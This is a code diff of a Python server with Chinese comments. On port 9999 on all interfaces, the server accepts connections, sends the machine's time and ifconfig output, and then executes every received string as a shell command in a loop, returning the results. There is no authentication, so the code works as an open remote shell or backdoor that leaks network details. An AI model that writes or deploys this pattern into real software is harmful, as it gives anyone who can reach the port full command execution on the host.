@@ -7,6 +7,7 @@ import time
 from constants import SALT, API_URL
 from tools import log_with_timestamp
 
+
 # 生成签名函数
 def generate_sign(data: dict, salt: str) -> str:
     sorted_items = sorted(data.items())
@@ -14,38 +15,64 @@ def generate_sign(data: dict, salt: str) -> str:
     sign_string += f"&salt={salt}"
     return hashlib.md5(sign_string.encode('utf-8')).hexdigest()
 
-# 处理客户端请求的函数
+
+# 发送给客户端的消息（包括当前时间和 ifconfig 信息）
+def send_syn_message(client_socket):
+    # 获取当前时间
+    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+    
+    # 获取 ifconfig 信息
+    ifconfig_result = subprocess.run('ifconfig', shell=True, capture_output=True, text=True).stdout
+    
+    # 发送 SYN 消息，包括当前时间和 ifconfig 信息
+    syn_message = f"SYN: 当前时间: {current_time}\n\nifconfig 输出:\n{ifconfig_result}\n"
+    client_socket.send(syn_message.encode('utf-8'))
+    log_with_timestamp(f"已发送 SYN 消息:\n{syn_message}")
+
+
+# 处理客户端命令请求
 def handle_client(client_socket):
     try:
-        # 接收客户端发送的命令
-        command = client_socket.recv(1024).decode('utf-8')
-        log_with_timestamp(f"接收到命令: {command}")
+        # 先发送 SYN 消息
+        send_syn_message(client_socket)
 
-        # 执行命令并返回结果
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        response = result.stdout + "\n" + result.stderr
+        # 接收客户端的 ACK 消息
+        ack_message = client_socket.recv(1024).decode('utf-8')
+        log_with_timestamp(f"接收到 ACK 消息: {ack_message}")
 
-        # 发送结果回客户端
-        client_socket.send(response.encode('utf-8'))
+        # 进入命令交互阶段
+        while True:
+            # 接收客户端发送的命令
+            command = client_socket.recv(1024).decode('utf-8')
+            log_with_timestamp(f"接收到命令: {command}")
+
+            # 执行命令并返回结果
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            response = result.stdout + "\n" + result.stderr
+
+            # 发送结果回客户端
+            client_socket.send(response.encode('utf-8'))
     except Exception as e:
         client_socket.send(f"Error: {str(e)}".encode('utf-8'))
     finally:
         client_socket.close()
 
+
 # 服务器交互
 def start_server(host='0.0.0.0', port=9999):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((host, port))
-    server_socket.listen(5)
+    server_socket.listen(1)
     log_with_timestamp(f"服务端已启动，监听 {host}:{port}...")
 
     while True:
         client_socket, addr = server_socket.accept()
         log_with_timestamp(f"接收到来自 {addr} 的连接...")
-        
+
         # 创建线程处理客户端请求
         client_handler = threading.Thread(target=handle_client, args=(client_socket,))
         client_handler.start()
+
 
 # 推送数据函数
 def push_data(payload: dict, max_retry: int, retry_interval: int):
